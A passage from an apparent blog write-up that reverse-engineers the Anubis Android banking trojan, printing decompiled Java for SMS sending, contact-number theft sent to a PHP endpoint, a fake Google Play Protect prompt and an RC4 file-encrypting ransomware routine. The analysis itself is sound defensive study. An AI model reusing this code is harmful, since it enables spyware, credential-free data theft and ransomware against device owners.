        ArrayList<String> divideMessage = smsManager.divideMessage(str2);
        PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent("SMS_SENT"), 0);
        PendingIntent broadcast2 = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED"), 0);
        ArrayList<PendingIntent> arrayList = new ArrayList<>();
        ArrayList<PendingIntent> arrayList2 = new ArrayList<>();
        for (int i = 0; i < divideMessage.size(); i++) {
            arrayList2.add(broadcast2);
            arrayList.add(broadcast);
        }
        smsManager.sendMultipartTextMessage(str, null, divideMessage, arrayList, arrayList2);
    }
```

There's no need of explainations for this one. It is pretty clear that this one is the method that really sends the SMS messages. Now I'm thinking of changing the name of `SomeHttpClass` to something more like `UtilClass` or `CrazyShitHappensHere`.

after sending the messages, `onStartCommand` registers a Broadcast receiver, which is in fact, `receiver`.

### Reading Contacts

```java
/* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.wami */
public class Contacts extends Activity {

    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {

            [... more code]

            if (stringExtra.contains("0")) {
                GetContacts(getContentResolver());
            }

            [... more code]

        } catch (Exception unused) {
            finish();
        }
    }

```

onCreate method initializes some local variables and calls another method that retrieves contact numbers.

```java
    public void GetContacts(ContentResolver contentResolver) {
        try {
            if (!this.cls.GetSharedPreference(this, "getNumber").equals("true")) {
                Cursor query = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                String str = "(" + this.cls.GetNetworkCountry(this) + ") Numbers from the phone book";
                while (query.moveToNext()) {
                    String string = query.getString(query.getColumnIndex("data1"));
                    String string2 = query.getString(query.getColumnIndex("display_name"));
                    if (!string.contains("*") && !string.contains("#") && string.length() > 6 && !str.contains(string)) {
                        str = str + string + "     " + string2 + "</br>" + '\n';
                    }
                }
                SomeHttpClass bVar = this.cls;
                StringBuilder sb = new StringBuilder();
                sb.append("p=");
                sb.append(this.cls.Encode(this.cls.GetSSAID(this) + "|" + str + "|"));
                bVar.exfiltrate(this, "4", sb.toString());
                this.cls.SetSharedPreference(this, "getNumber", "true");
                finish();
            }
        } catch (Exception unused) {
            finish();
        }
    }
```

Inside the try block, `GetContacts` method checks if shared preference `getNumber` is equal to `true`. if so, method uses a ContentResolver to retrieve contact number. then it checks if `string` contatins **"*"** or **"#"**. it also checks if `str`, which is essentially the country code is in the retrieved number. if not, it appends `str` with the number. 

Then it sends it to an endpoint `/o1o/a6.php`. Note the line break (</br>) appended to the end of the string. it seems like malware sends data back and forth using html format.

It also sets shared preference value for `getNumber to true`.

This service also implements a method that sends an SMS to every contact number with SMS body being the SSAID of the device.

### Say No to google play protect 

When we were reversing the shared preferences, we saw that the malware is capable of disabling google play protect. but it is initially disabled. Since we already know `Service1`, which was invoked by `MainActivity` is responsible for enabling and disabling shared preferences, we can take a look aat that.

```java
                                if (new File(dir2, sb4.toString()).exists()) {
                                    try {
                                        if (this.cls.GetSharedPreference(this, "play_protect").equals("true")) {
                                            Intent intent3 = new Intent(this, DisplayGooglePlayProtect.class);
                                            intent3.addFlags(268435456);
                                            intent3.addFlags(1073741824);
                                            startActivity(intent3);
                                        }
                                    } catch (Exception unused5) {
                                        this.cls.mo213a("jtfxlnc", "ERROR getProtect");
                                    }
```
See?, it cheks if some file or directory exists and calls `GetSharedPreference(this, "play_protect")`. if the result is equal to true, 
if creates another activity, named `DisplayGooglePlayProtect`.

let's focus on that.

```java
public class DisplayGooglePlayProtect extends Activity {

    [... more code]

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        String str;
        String str2;
        super.onCreate(bundle);
        this.ctx = this;
        try {
            str = this.cls.GetSharedPreference(this, "textPlayProtect");
            try {
                str2 = this.cls.GetSharedPreference(this, "buttonPlayProtect");
            } catch (Exception unused) {
            }

        [... more code]
```

inside the try block, `onCreate` method calls `GetSharedPreference(this, "textPlayProtect")` and assigns returning string to `str`. inside another nested try block, it calls `GetSharedPreference(this, "buttonPlayProtect")` and assigns return string to `str2`.

it looks like those keys refer to some strings that used when asking for permissions.

```xml
<string name="textPlayProtect">The system does not work correctly, disable Google Play Protect!</string>
<string name="buttonPlayProtect">Сontinue</string>
```

```java
        AlertDialog.Builder builder2 = new AlertDialog.Builder(this);
        builder2.setTitle("Google Play Protect").setMessage(str).setIcon(R.drawable.im).setCancelable(false).setNegativeButton(str2, new DialogInterface.OnClickListener() {
            /* class wocwvy.p003x881dce2d.slsa.ncec.ActivityC0062x231814f.DialogInterface$OnClickListenerC00631 */

            public void onClick(DialogInterface dialogInterface, int i) {
                Intent intent = new Intent();
                intent.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                try {
                    DisplayGooglePlayProtect.this.startActivity(intent);
                    DisplayGooglePlayProtect.this.ctx.startService(new Intent(DisplayGooglePlayProtect.this.ctx, ServiceC0111x5ad12ef2.class));
                } catch (ActivityNotFoundException unused) {
                    DisplayGooglePlayProtect.this.cls.mo213a("ERROR", "ActPlayProtect");
                }
                dialogInterface.cancel();
            }
        });
        try {
            builder2.create().show();
        } catch (Exception unused3) {
        }
```

here, it uses previously retreived values to create an `AlertBuilder` that requests permission to disable google play protect.

### Ransomware Mode

We saw it in the manifest that anubis has ransomware capabilities.

```java
public class wahiuolww extends IntentService {

    /* renamed from: a */
    SomeHttpClass cls = new SomeHttpClass();

    /* renamed from: b */
    String str = "";

    /* renamed from: c */
    String str1 = "";

    public wahiuolww() {
        super("wahiuolww");
    }

    public void onHandleIntent(Intent intent) {
        SomeHttpClass bVar;
        String str;
        String str2;
        this.str = this.cls.GetSharedPreference(this, "status");
        this.str1 = this.cls.GetSharedPreference(this, "key");
        File file = new File("/mnt");
        File file2 = new File("/mount");
        File file3 = new File("/sdcard");
        File file4 = new File("/storage");
        this.cls.mo213a("Cryptolocker", "1");
        mo458a(Environment.getExternalStorageDirectory());
        this.cls.mo213a("Cryptolocker", "2");
        mo458a(file);
        this.cls.mo213a("Cryptolocker", "3");
        mo458a(file2);
        this.cls.mo213a("Cryptolocker", "4");
        mo458a(file3);
        this.cls.mo213a("Cryptolocker", "5");

        [... more code]
    }
}
```

`onHandleIntent` method initializes strings `str` and `str1` with the values of shared preference `"status"` and `"key"`. The key might be the encryption key. Then it initializes 4 objects of class `File`, for `"/mnt"`, `"/mount"`, `"/sdcard"` and `"/storage"`.

Then it calls another method called `mo458a` implemented in the same class on each `File` plus `ExternalStorageDirectory()`.

```java
   public void mo458a(File file) {
        FileOutputStream fileOutputStream;
        try {
            File[] listFiles = file.listFiles();
            for (File file2 : listFiles) {
                if (file2.isDirectory()) {
                    mo459b(file2);
                } 

                [... more code]
```

The method accepts a `File` as the first and only parameter. It declares a `FileOutputStream` variable, then inside the try block, 
it creates an array of type `File` named `listFiles` and initialize the array using `listFiles()` on the first parameter.

then it iterates through each and every file. if file is directory, it calls itself. it looks like it the method is recursively traversing nodes of the file system.

```java
                else if (file2.isFile()) {
                    try {
                        SomeHttpClass bVar = this.cls;
                        byte[] a = SomeHttpClass.ReadFile(file2);
                        if (this.str.equals("crypt")) {
                            if (!file2.getPath().contains(".AnubisCrypt")) {
                                byte[] a2 = this.cls.rc4encrypt(a, this.str1);
                                fileOutputStream = new FileOutputStream(file2.getPath() + ".AnubisCrypt", true);
                                fileOutputStream.write(a2);
                            }

                [... more code]
```

else, if it is a file, it calls `SomeHttpClass.ReadFile` on it and stores the data in a byte array. then it checks if `str`, which is
the global variable that holds the value of shared preference `status` is equal `"crypt"`. if yes, another nested if statement checks 
whether current file's extension is equal to `.AnubisCrypt`. if yes, it calls `SomeHttpClass.rc4encrypt` by passing byte array `a` and 
`str1`, which is the key, as arguments. returning byte array is assigned to a new byte array called `a2`.

Then a new file is created with the same name but `.AnubisCrypt` appended to the end of it. byte array `a2` is then written to the newly
created file.

```java
                        } else if (this.str.equals("decrypt") && file2.getPath().contains(".AnubisCrypt")) {
                            byte[] b = this.cls.rc4decrypt(a, this.str1);
                            fileOutputStream = new FileOutputStream(file2.getPath().replace(".AnubisCrypt", ""), true);
                            fileOutputStream.write(b);
                        }
```

if `str` (status) is equal to `"decrypt"` and if current file's path contains `.AnubisCrypt` as it's extension, a byte array `b` is 
created and assigned to the return value of `SomeHttpClass.rc4decrypt`. then a new file is created without the extensionm which will then 
be fiiled with byte array `b`.

```java
                        fileOutputStream.close();
                        file2.delete();
                    } catch (Exception unused) {
                    }
```

then the output stream is closed and file is deleted from the disk.

We can conclude that this method is the on in charge for encrypting and decrypting the file system based on the shared preferene value `status`.


# The end

This is the longest article I have ever typed. hell its over 2000 lines. So eayh, we started analysis with 0 knowledge on a random malware and dissected various part of it using both dynamic and static analysis techniques to understand what it is capable of doing.  

with our understanding about the malware, we can conclude that anubis is a very sophisticated banking trojan, and is capable of many things. 

#Speard anarchy
